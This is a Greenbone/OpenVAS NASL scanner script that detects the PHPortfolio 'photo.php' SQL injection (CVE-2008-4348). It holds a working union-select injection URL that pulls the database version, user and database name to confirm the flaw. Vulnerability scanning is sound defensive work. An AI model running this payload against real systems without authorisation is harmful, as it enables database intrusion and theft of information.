if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902521" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)" );
	script_cve_id( "CVE-2008-4348" );
	script_bugtraq_id( 31143 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PHPortfolio 'photo.php' SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/45078" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17316/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information." );
	script_tag( name: "affected", value: "PHPortfolio version 1.3 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  via the 'id' parameter in photo.php, which allows attacker to manipulate SQL
  queries by injecting arbitrary SQL code." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running PHPortfolio and is prone to SQL injection
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/phportfolio", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(egrep( pattern: "Powered by.*>PHPortfolio<", string: res )){
		url = NASLString( dir, "/photo.php?id=48+and+1=2+union+select+1,version(),", "user(),database(),0x", vt_strings["default_hex"], "6--" );
		if(http_vuln_check( port: port, url: url, pattern: ">" + vt_strings["default"] + "<", extra_check: make_list( ">film:<",
			 ">lens:<",
			 ">location:<" ) )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

